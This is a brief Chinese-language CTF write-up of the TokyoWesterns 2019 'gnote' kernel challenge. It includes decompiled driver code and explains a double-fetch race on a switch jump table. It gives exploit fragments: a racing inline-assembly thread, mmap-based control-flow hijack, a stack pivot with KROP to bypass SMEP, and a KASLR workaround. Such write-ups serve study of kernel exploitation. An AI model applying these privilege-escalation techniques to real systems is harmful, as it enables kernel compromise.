# tokyo019 gnote
## IDA

```c
switch ( *buf )
  {
    case 1:                                     // cmd 1: add usr{size|cmd}
      if ( (unsigned __int64)cnt <= 7 )
      {
        v4 = (unsigned int)buf[1];
        v5 = &notes[cnt];
        *(_QWORD *)&v5->size = v4;
        if ( v4 <= 0x10000 )
        {
          v6 = _kmalloc(v4, 0x6000C0LL);
          ++cnt;
          v5->ptr = (size_t *)v6;
        }
      }
      break;
    case 5:                                     // cmd 5: set selected
      if ( (unsigned int)buf[1] < (unsigned __int64)cnt )
        selected = (unsigned int)buf[1];
      break;
    default:
      break;
  }

.text:0000000000000019                 cmp     dword ptr [rbx], 5 ; switch 6 cases
.text:000000000000001C                 ja      short def_28    ; jumptable 0000000000000028 default case, case 0
.text:000000000000001E                 mov     eax, [rbx]
.text:0000000000000020                 mov     rax, ds:jpt_28[rax*8]
.text:0000000000000028                 jmp     __x86_indirect_thunk_rax ; switch jump
```

问题出现在switch的跳转表上，可见在0x19与0x20两条指令之间存在double fetch的错误，在用户态的另一个线程不停修改*buf的内容，则会出现*buf大于5的情况。

## 调试

1. 信息泄漏

由于没有初始化note的内容，因此可以通过spray seq_operation来泄漏内核基址。

2. 关闭kaslr

```c
void* thread_func(void* arg) {
    asm volatile("mov %1, %%eax\n"
                 "mov %0, %%rbx\n"
                 "lbl:\n"
                 "xchg (%%rbx), %%eax\n"
                 "jmp lbl\n"
                 :
                 : "r" (arg), "r" (jmp_idx)
                 : "rax", "rbx"
                 );
    return 0;
}
//关闭kaslr时，发现jpt_28跳转表的机制是0xffffffffc0001098
//因此设置jmp_idx可以劫持指令流到0x1000
size_t * page = mmap(0x1000, MAP_SIZE,  PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
jmp_idx = ((size_t)page + 0x3fffef68) / 8;
//后面通过xchg_eax_esp来劫持栈，进行绕过SMEP机制的KROP即可
```

3. 打开kaslr

注意模块的偏移与内核偏移没有关系，模块的偏移在0x1000000之间，因此可以分配16M的mmap空间，在相应页偏移写好xchg_eax_esp的地址即可。然而，这样做mmap会失败，因为正常程序.text段会在这个范围内，本题可以通过`gcc exp.c -o exp -static -pthread -Wl,--section-start=.note.gnu.build-id=0x40200200`来避免mmap失败。也可以使mmap分配到其他位置，然后修改对应的jmp_idx，但是需要注意xchg得到的rax只有32位的大小，因此jmp_table不能跳到较高的地址。
